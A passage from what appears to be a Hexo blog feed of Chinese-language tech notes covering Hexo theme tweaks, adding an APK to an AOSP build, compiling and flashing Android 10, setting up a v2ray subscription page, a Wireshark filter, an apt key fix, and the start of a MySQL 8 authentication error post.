Ribbons选择自己喜欢的图标，然后copy相应的代码。"></a>5.4.1、首先到GitHub Corners或者GitHub Ribbons选择自己喜欢的图标，然后copy相应的代码。</h5><h5 id="5-4-2、然后将刚才复制的代码粘贴到themes-next-layout-layout-swig文件中下面一行。"><a href="#5-4-2、然后将刚才复制的代码粘贴到themes-next-layout-layout-swig文件中下面一行。" class="headerlink" title="5.4.2、然后将刚才复制的代码粘贴到themes&#x2F;next&#x2F;layout&#x2F;_layout.swig文件中&lt;div class&#x3D;”headband”&gt;&lt;&#x2F;div&gt;下面一行。"></a>5.4.2、然后将刚才复制的代码粘贴到themes&#x2F;next&#x2F;layout&#x2F;_layout.swig文件中&lt;div class&#x3D;”headband”&gt;&lt;&#x2F;div&gt;下面一行。</h5><h5 id="5-4-3、把代码中的href后面的值替换成你要跳转的地址，比如你的GitHub主页。"><a href="#5-4-3、把代码中的href后面的值替换成你要跳转的地址，比如你的GitHub主页。" class="headerlink" title="5.4.3、把代码中的href后面的值替换成你要跳转的地址，比如你的GitHub主页。"></a>5.4.3、把代码中的href后面的值替换成你要跳转的地址，比如你的GitHub主页。</h5><p>以下是采用的代码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;https://your-url&quot;</span> class=<span class="string">&quot;github-corner&quot;</span> aria-label=<span class="string">&quot;View source on GitHub&quot;</span>&gt;&lt;svg width=<span class="string">&quot;80&quot;</span> height=<span class="string">&quot;80&quot;</span> viewBox=<span class="string">&quot;0 0 250 250&quot;</span> style=<span class="string">&quot;fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;&quot;</span> aria-hidden=<span class="string">&quot;true&quot;</span>&gt;&lt;path d=<span class="string">&quot;M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z&quot;</span>&gt;&lt;/path&gt;&lt;path d=<span class="string">&quot;M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2&quot;</span> fill=<span class="string">&quot;currentColor&quot;</span> style=<span class="string">&quot;transform-origin: 130px 106px;&quot;</span> class=<span class="string">&quot;octo-arm&quot;</span>&gt;&lt;/path&gt;&lt;path d=<span class="string">&quot;M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z&quot;</span> fill=<span class="string">&quot;currentColor&quot;</span> class=<span class="string">&quot;octo-body&quot;</span>&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;style&gt;.github-corner:hover .octo-arm&#123;animation:octocat-wave 560ms ease-in-out&#125;@keyframes octocat-wave&#123;0%,100%&#123;transform:rotate(0)&#125;20%,60%&#123;transform:rotate(-25deg)&#125;40%,80%&#123;transform:rotate(10deg)&#125;&#125;@media (max-width:500px)&#123;.github-corner:hover .octo-arm&#123;animation:none&#125;.github-corner .octo-arm&#123;animation:octocat-wave 560ms ease-in-out&#125;&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure><h4 id="5-5、修复首页显示图片问题"><a href="#5-5、修复首页显示图片问题" class="headerlink" title="5.5、修复首页显示图片问题"></a>5.5、修复首页显示图片问题</h4><p>在根目录下打开git bash，然后运行以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Owners-MacBook-Pro:w4lden $ npm install https://github.com/xcodebuild/hexo-asset-image.git</span><br></pre></td></tr></table></figure><p>该插件的作用：将图片等静态资源的引用路径转化为绝对路径。<br>【注】我最开始不是用的上面命令安装的，用的是npm install hexo-asset-image – save，该命令安装的是插件 hexo-asset-image 1.0 ，这个版本有点问题，安装后图片不能正常显示，查看图片路径被渲染成了 &#x2F;.xx&#x2F;abc.png 的格式（xx 是域名后缀）。最后采用上面的命令才成功。</p><h3 id="6、参考"><a href="#6、参考" class="headerlink" title="6、参考"></a>6、参考</h3><p><a href="https://blog.csdn.net/W_317/article/details/106518894">https://blog.csdn.net/W_317/article/details/106518894</a><br><a href="https://www.cnblogs.com/yyhimmy/p/12583411.html">https://www.cnblogs.com/yyhimmy/p/12583411.html</a><br><a href="http://www.360doc.com/content/19/0418/20/22888630_829741117.shtml">http://www.360doc.com/content/19/0418/20/22888630_829741117.shtml</a><br><a href="https://blog.csdn.net/fly_wugui/article/details/108638358">https://blog.csdn.net/fly_wugui/article/details/108638358</a><br><a href="https://blog.csdn.net/mqdxiaoxiao/article/details/93796367/">https://blog.csdn.net/mqdxiaoxiao/article/details/93796367/</a><br><a href="https://juejin.cn/post/7273435095922114560">https://juejin.cn/post/7273435095922114560</a><br><a href="https://theme-next.js.org/docs/getting-started/">https://theme-next.js.org/docs/getting-started/</a><br><a href="https://hexo.io/themes/">https://hexo.io/themes/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>aosp添加第三方app</title>
      <link href="/2024/02/02/aosp%E6%B7%BB%E5%8A%A0%E7%AC%AC%E4%B8%89%E6%96%B9app/"/>
      <url>/2024/02/02/aosp%E6%B7%BB%E5%8A%A0%E7%AC%AC%E4%B8%89%E6%96%B9app/</url>
      
        <content type="html"><![CDATA[<h3 id="1、添加apk和mk文件"><a href="#1、添加apk和mk文件" class="headerlink" title="1、添加apk和mk文件"></a>1、添加apk和mk文件</h3><p>新建目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/srcAndroid/packages/apps</span><br><span class="line"><span class="built_in">mkdir</span> WiFiADB</span><br></pre></td></tr></table></figure><p>复制apk到该目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> WiFiADB</span><br><span class="line"><span class="built_in">cp</span> ~/Downloads/WiFiADB.apk .</span><br></pre></td></tr></table></figure><p>创建Android.mk文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit Android.mk</span><br></pre></td></tr></table></figure><p>内容为</p><figure class="highlight make"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">LOCAL_PATH:= <span class="variable">$(<span class="built_in">call</span> my-<span class="built_in">dir</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(CLEAR_VARS)</span></span><br><span class="line">LOCAL_MODULE := WiFiADB</span><br><span class="line">LOCAL_MODULE_TAGS := optional</span><br><span class="line">LOCAL_SRC_FILES := <span class="variable">$(LOCAL_MODULE)</span>.apk</span><br><span class="line">LOCAL_MODULE_CLASS := APPS</span><br><span class="line">LOCAL_MODULE_SUFFIX := <span class="variable">$(COMMON_ANDROID_PACKAGE_SUFFIX)</span></span><br><span class="line">LOCAL_CERTIFICATE := PRESIGNED</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$(BUILD_PREBUILT)</span></span><br></pre></td></tr></table></figure><p>查看结果</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">owner@ubuntu:~/srcAndroid/packages/apps/WiFiADB$ <span class="built_in">ls</span> -lt</span><br><span class="line">total 1712</span><br><span class="line">-rw-rw-r-- 1 owner owner     284 Jan 31 12:15 Android.mk</span><br><span class="line">-rwx------ 1 owner owner 1745579 Nov 29  2021 WiFiADB.apk</span><br></pre></td></tr></table></figure><h3 id="2、添加到aosp编译选项"><a href="#2、添加到aosp编译选项" class="headerlink" title="2、添加到aosp编译选项"></a>2、添加到aosp编译选项</h3><p>编辑aosp_sailfish.mk文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">owner@ubuntu:~/srcAndroid/device/google/marlin$ gedit aosp_sailfish.mk</span><br></pre></td></tr></table></figure><p>添加WiFiADB</p><figure class="highlight make"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PRODUCT_PACKAGES += \</span><br><span class="line">    WiFiADB \</span><br><span class="line">    Launcher3 \</span><br><span class="line">    WallpaperPicker</span><br></pre></td></tr></table></figure><h3 id="3、编译"><a href="#3、编译" class="headerlink" title="3、编译"></a>3、编译</h3><p>正常编译aosp就行</p><h3 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h3><p><a href="https://www.sunofbeach.net/a/1601128372085383170">https://www.sunofbeach.net/a/1601128372085383170</a><br><a href="https://blog.csdn.net/u011341111/article/details/84312233">https://blog.csdn.net/u011341111/article/details/84312233</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> aosp </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编译Android10源码</title>
      <link href="/2020/10/15/%E7%BC%96%E8%AF%91Android10%E6%BA%90%E7%A0%81/"/>
      <url>/2020/10/15/%E7%BC%96%E8%AF%91Android10%E6%BA%90%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h2 id="1-准备环境"><a href="#1-准备环境" class="headerlink" title="1 准备环境"></a>1 准备环境</h2><h3 id="1-1-下载源码"><a href="#1-1-下载源码" class="headerlink" title="1.1 下载源码"></a>1.1 下载源码</h3><p>安装v2ray设置代理？（export http_proxy&#x3D;<a href="http://127.0.0.1:1089;export">http://127.0.0.1:1089;export</a> https_proxy&#x3D;<a href="http://127.0.0.1:1089;）">http://127.0.0.1:1089;）</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b android-10.0.0_r2</span><br><span class="line">./down.sh </span><br><span class="line">../repo <span class="built_in">sync</span> --current-branch</span><br></pre></td></tr></table></figure><p>下载完后删除其他文件，节省空间</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -rf .repo/</span><br></pre></td></tr></table></figure><h3 id="1-2-安装openjdk-1-8"><a href="#1-2-安装openjdk-1-8" class="headerlink" title="1.2 安装openjdk 1.8"></a>1.2 安装openjdk 1.8</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openjdk-8-jdk</span><br></pre></td></tr></table></figure><h3 id="1-3-安装其他模块"><a href="#1-3-安装其他模块" class="headerlink" title="1.3 安装其他模块"></a>1.3 安装其他模块</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install m4</span><br></pre></td></tr></table></figure><h3 id="1-4-添加驱动文件"><a href="#1-4-添加驱动文件" class="headerlink" title="1.4 添加驱动文件"></a>1.4 添加驱动文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./extract-qcom-sailfish.sh</span><br><span class="line">./extract-google_devices-sailfish.sh </span><br></pre></td></tr></table></figure><h2 id="2-编译"><a href="#2-编译" class="headerlink" title="2 编译"></a>2 编译</h2><h3 id="2-1-编译命令"><a href="#2-1-编译命令" class="headerlink" title="2.1 编译命令"></a>2.1 编译命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> build/envsetup.sh</span><br><span class="line">lunch 16</span><br><span class="line">make -j 8</span><br></pre></td></tr></table></figure><h3 id="2-2-遇到问题"><a href="#2-2-遇到问题" class="headerlink" title="2.2 遇到问题"></a>2.2 遇到问题</h3><h4 id="2-2-1-内存不足"><a href="#2-2-1-内存不足" class="headerlink" title="2.2.1 内存不足"></a>2.2.1 内存不足</h4><p>解决办法：增加Swap分区大小</p><h5 id="2-2-1-1-检查当前分区情况"><a href="#2-2-1-1-检查当前分区情况" class="headerlink" title="2.2.1.1 检查当前分区情况"></a>2.2.1.1 检查当前分区情况</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free -m</span><br></pre></td></tr></table></figure><h5 id="2-2-1-2-增加交换分区文件及大小"><a href="#2-2-1-2-增加交换分区文件及大小" class="headerlink" title="2.2.1.2 增加交换分区文件及大小"></a>2.2.1.2 增加交换分区文件及大小</h5><p>如果要增加8G大小的交换分区，则命令写法如下，其中的 count 等于想要的块大小。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">dd</span> <span class="keyword">if</span>=/dev/zero of=/home/swap bs=1024 count=8192000</span><br></pre></td></tr></table></figure><h5 id="2-2-1-3-设置交换文件"><a href="#2-2-1-3-设置交换文件" class="headerlink" title="2.2.1.3 设置交换文件"></a>2.2.1.3 设置交换文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mkswap /home/swap</span><br></pre></td></tr></table></figure><h5 id="2-2-1-4-立即启用交换分区文件"><a href="#2-2-1-4-立即启用交换分区文件" class="headerlink" title="2.2.1.4 立即启用交换分区文件"></a>2.2.1.4 立即启用交换分区文件</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo swapon /home/swap </span><br></pre></td></tr></table></figure><h5 id="2-2-1-5-如果要在引导时自动启用，则编辑-etc-fstab-文件，添加行："><a href="#2-2-1-5-如果要在引导时自动启用，则编辑-etc-fstab-文件，添加行：" class="headerlink" title="2.2.1.5 如果要在引导时自动启用，则编辑 &#x2F;etc&#x2F;fstab 文件，添加行："></a>2.2.1.5 如果要在引导时自动启用，则编辑 &#x2F;etc&#x2F;fstab 文件，添加行：</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/swap swap swap defaults 0 0 </span><br></pre></td></tr></table></figure><p>系统下次引导时，它就会启用新建的交换文件，再查看SWAP分区大小发现增加了8G。</p><h2 id="3-刷机"><a href="#3-刷机" class="headerlink" title="3 刷机"></a>3 刷机</h2><h3 id="3-1-刷机命令"><a href="#3-1-刷机命令" class="headerlink" title="3.1 刷机命令"></a>3.1 刷机命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">owner@ubuntu:~/srcAndroid/out/host/linux-x86/bin$ ./adb reboot bootloader</span><br><span class="line">owner@ubuntu:~/srcAndroid/out/host/linux-x86/bin$ sudo ./fastboot devices</span><br><span class="line">owner@ubuntu:~/srcAndroid/out/host/linux-x86/bin$ sudo ANDROID_PRODUCT_OUT=/home/owner/srcAndroid/out/target/product/sailfish ./fastboot flashall -w</span><br></pre></td></tr></table></figure><h3 id="3-2-遇到问题"><a href="#3-2-遇到问题" class="headerlink" title="3.2 遇到问题"></a>3.2 遇到问题</h3><h4 id="3-2-1-Pixel1连不上VMWare"><a href="#3-2-1-Pixel1连不上VMWare" class="headerlink" title="3.2.1 Pixel1连不上VMWare"></a>3.2.1 Pixel1连不上VMWare</h4><p>解决办法：关闭VMWare虚拟机，将USB连接设置成USB3.1</p><h4 id="3-2-2-adb-报错：no-permissions-user-in-plugdev-group；-are-your-udev-rules-wrong"><a href="#3-2-2-adb-报错：no-permissions-user-in-plugdev-group；-are-your-udev-rules-wrong" class="headerlink" title="3.2.2 adb 报错：no permissions (user in plugdev group； are your udev rules wrong?)"></a>3.2.2 adb 报错：no permissions (user in plugdev group； are your udev rules wrong?)</h4><p>解决办法：</p><h5 id="3-2-2-1-查看自己的android设备"><a href="#3-2-2-1-查看自己的android设备" class="headerlink" title="3.2.2.1 查看自己的android设备"></a>3.2.2.1 查看自己的android设备</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsusb</span><br></pre></td></tr></table></figure><p>找到pixel的idVendor和idProduct（替换下一步设备文件对应的值）</p><h5 id="3-2-2-2-新建设备文件-文件名随便"><a href="#3-2-2-2-新建设备文件-文件名随便" class="headerlink" title="3.2.2.2 新建设备文件(文件名随便)"></a>3.2.2.2 新建设备文件(文件名随便)</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/udev/rules.d/90-android.rules</span><br></pre></td></tr></table></figure><p>内容:<br>SUBSYSTEM&#x3D;&#x3D;”usb”,ATTRS{idVendor}&#x3D;&#x3D;”18f8”,ATTRS{idProduct}&#x3D;&#x3D;”0f99”,MODE&#x3D;”0666”,GROUP&#x3D;”plugdev”,SYMLINK+&#x3D;”android”,SYMLINK+&#x3D;”android_adb”<br>需要替换: ATTRS{idVendor}&#x3D;&#x3D;”xxxx” ,ATTRS{idProduct}&#x3D;&#x3D;”xxxx”</p><h5 id="3-2-2-3-重启adb服务"><a href="#3-2-2-3-重启adb服务" class="headerlink" title="3.2.2.3 重启adb服务"></a>3.2.2.3 重启adb服务</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">owner@ubuntu:/etc/udev/rules.d$ sudo udevadm control --reload-rules</span><br><span class="line">owner@ubuntu:/etc/udev/rules.d$ sudo service udev restart</span><br><span class="line">owner@ubuntu:/etc/udev/rules.d$ sudo udevadm trigger</span><br><span class="line">owner@ubuntu:~/srcAndroid/out/host/linux-x86/bin$ ./adb kill-server</span><br><span class="line">owner@ubuntu:~/srcAndroid/out/host/linux-x86/bin$ ./adb start-server</span><br></pre></td></tr></table></figure><h5 id="3-2-2-4-确认设备连接成功"><a href="#3-2-2-4-确认设备连接成功" class="headerlink" title="3.2.2.4 确认设备连接成功"></a>3.2.2.4 确认设备连接成功</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 源码编译 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> aosp </tag>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>v2ray订阅地址制作</title>
      <link href="/2020/04/10/v2ray%E8%AE%A2%E9%98%85%E5%9C%B0%E5%9D%80%E5%88%B6%E4%BD%9C/"/>
      <url>/2020/04/10/v2ray%E8%AE%A2%E9%98%85%E5%9C%B0%E5%9D%80%E5%88%B6%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h3 id="1、index-html文件制作"><a href="#1、index-html文件制作" class="headerlink" title="1、index.html文件制作"></a>1、index.html文件制作</h3><p>将自己的vmess地址编码成base64字符串，保存为index.html</p><h3 id="2、搭建web站点"><a href="#2、搭建web站点" class="headerlink" title="2、搭建web站点"></a>2、搭建web站点</h3><p>这里以ubuntu服务器上安装lamp为例说明</p><h4 id="2-1、安装lamp"><a href="#2-1、安装lamp" class="headerlink" title="2.1、安装lamp"></a>2.1、安装lamp</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install lamp-server^</span><br></pre></td></tr></table></figure><p>出现错误（apache服务器启动失败）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@hwsrv-623577:~<span class="comment"># /etc/init.d/apache2 start</span></span><br><span class="line">[....] Starting apache2 (via systemctl): apache2.serviceJob <span class="keyword">for</span> apache2.service failed because the control process exited with error code.</span><br><span class="line">See <span class="string">&quot;systemctl status apache2.service&quot;</span> and <span class="string">&quot;journalctl -xe&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line"> failed!</span><br><span class="line">root@hwsrv-623577:~<span class="comment"># systemctl status apache2.service</span></span><br><span class="line">● apache2.service - The Apache HTTP Server</span><br><span class="line">   Loaded: loaded (/lib/systemd/system/apache2.service; enabled; vendor preset: enabled)</span><br><span class="line">  Drop-In: /lib/systemd/system/apache2.service.d</span><br><span class="line">           └─apache2-systemd.conf</span><br><span class="line">   Active: failed (Result: exit-code) since Fri 2020-04-10 14:41:47 CST; 3min 30s ago</span><br><span class="line">  Process: 30938 ExecStart=/usr/sbin/apachectl start (code=exited, status=1/FAILURE)</span><br><span class="line"></span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com systemd[1]: Starting The Apache HTTP Server...</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com apachectl[30938]: (98)Address already <span class="keyword">in</span> use: AH00072: make_sock: could no</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com apachectl[30938]: (98)Address already <span class="keyword">in</span> use: AH00072: make_sock: could no</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com apachectl[30938]: no listening sockets available, shutting down</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com apachectl[30938]: AH00015: Unable to open logs</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com apachectl[30938]: Action <span class="string">&#x27;start&#x27;</span> failed.</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com apachectl[30938]: The Apache error <span class="built_in">log</span> may have more information.</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com systemd[1]: apache2.service: Control process exited, code=exited status=1</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com systemd[1]: apache2.service: Failed with result <span class="string">&#x27;exit-code&#x27;</span>.</span><br><span class="line">Apr 10 14:41:47 hwsrv-623577.hostwindsdns.com systemd[1]: Failed to start The Apache HTTP Server.</span><br></pre></td></tr></table></figure><p>说明80端口被用<br>终端：  ps -ef|grep httpd察看占用的进程或者用netstat -lnp|grep 80</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@hwsrv-623577:~<span class="comment"># netstat -lnp|grep 80</span></span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      740/v2ray</span><br></pre></td></tr></table></figure><p>这是因为我vps上v2ray服务占用了80端口<br>将apache2的默认端口修改成8080</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/apache2/ports.conf</span><br><span class="line">listen 8080</span><br></pre></td></tr></table></figure><p>启动apache2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start </span><br></pre></td></tr></table></figure><h4 id="2-2、替换index-html"><a href="#2-2、替换index-html" class="headerlink" title="2.2、替换index.html"></a>2.2、替换index.html</h4><p>web站点搭建好后，用上面的index.html文件替换掉默认的index.html文件（web目录为&#x2F;var&#x2F;www）</p><h3 id="3、配置订阅"><a href="#3、配置订阅" class="headerlink" title="3、配置订阅"></a>3、配置订阅</h3><p>将站点地址填入代理app(小火箭等)的订阅地址中<br>(因为v2ray的vmss协议官方没规定格式，所以v2rayN和quantumult的格式不一样，使用如下网页工具<br><a href="https://quan.eicky.com/">https://quan.eicky.com/</a><br>可以将v2ray的vmess转换为Quantumult_Vmess)</p><h3 id="4、参考"><a href="#4、参考" class="headerlink" title="4、参考"></a>4、参考</h3><p><a href="https://yangwenqing.com/archives/748/">https://yangwenqing.com/archives/748/</a></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v2ray </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wireshark过滤规则</title>
      <link href="/2020/03/06/wireshark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/"/>
      <url>/2020/03/06/wireshark%E8%BF%87%E6%BB%A4%E8%A7%84%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h3 id="1、http返回状态码过滤"><a href="#1、http返回状态码过滤" class="headerlink" title="1、http返回状态码过滤"></a>1、http返回状态码过滤</h3><p>http.response.code&#x3D;&#x3D;302</p>]]></content>
      
      
      <categories>
          
          <category> 抓包 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu apt-get update NO_PUBKEY</title>
      <link href="/2020/03/05/ubuntu-apt-get-update-NO-PUBKEY/"/>
      <url>/2020/03/05/ubuntu-apt-get-update-NO-PUBKEY/</url>
      
        <content type="html"><![CDATA[<h3 id="1、错误描述"><a href="#1、错误描述" class="headerlink" title="1、错误描述"></a>1、错误描述</h3><p>sudo apt-get update,出现如下错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">W: An error occurred during the signature verification. The repository is not updated and the previous index files will be used. GPG error: http://dl.google.com/linux/chrome/deb stable Release: The following signatures couldn<span class="string">&#x27;t be verified because the public key is not available: NO_PUBKEY 78BD65473CB3BD13</span></span><br><span class="line"><span class="string">W: Failed to fetch http://dl.google.com/linux/chrome/deb/dists/stable/Release.gpg  The following signatures couldn&#x27;</span>t be verified because the public key is not available: NO_PUBKEY 78BD65473CB3BD13</span><br><span class="line">W: Some index files failed to download. They have been ignored, or old ones used instead.</span><br></pre></td></tr></table></figure><h3 id="2、解决方法"><a href="#2、解决方法" class="headerlink" title="2、解决方法"></a>2、解决方法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-key adv --refresh-keys --keyserver keyserver.ubuntu.com</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phpMyAdmin连接MySQL8.0报错2054</title>
      <link href="/2020/03/04/phpMyAdmin%E8%BF%9E%E6%8E%A5MySQL8-0%E6%8A%A5%E9%94%992054/"/>
      <url>/2020/03/04/phpMyAdmin%E8%BF%9E%E6%8E%A5MySQL8-0%E6%8A%A5%E9%94%992054/</url>
      
        <content type="html"><![CDATA[<h3 id="1、报错场景"><a href="#1、报错场景" class="headerlink" title="1、报错场景"></a>1、报错场景</h3><p>在正确输入了MySQL用户名和密码后，phpMyAdmin连接MySQL8.0报错2054，无法登录MySQL服务器</p><h3 id="2、报错原因"><a href="#2、报错原因" class="headerlink" title="2、报错原因"></a>2、报错原因</h3><p>由于mysql8.0默认使用了新的密码验证插件<font color=red size=4>caching_sha2_password</font>，而之前的PHP版本中所带的mysqlnd不能支持新的验证方式。</p><h3 id="3、解决方法"><a href="#3、解决方法" class="headerlink" title="3、解决方法"></a>3、解决方法</h3><p>删除创建的用户和授权</p><h4 id="3-1、查看当前的密码验证方式"><a href="#3-1、查看当前的密码验证方式" class="headerlink" title="3.1、查看当前的密码验证方式"></a>3.1、查看当前的密码验证方式</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; <span class="keyword">select</span> User,plugin from user <span class="built_in">where</span> User = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">+------+-----------------------+</span><br><span class="line">| User | plugin                |</span><br><span class="line">+------+-----------------------+</span><br><span class="line">| root | caching_sha2_password |</span><br><span class="line">+------+-----------------------+</span><br><span class="line">1 row <span 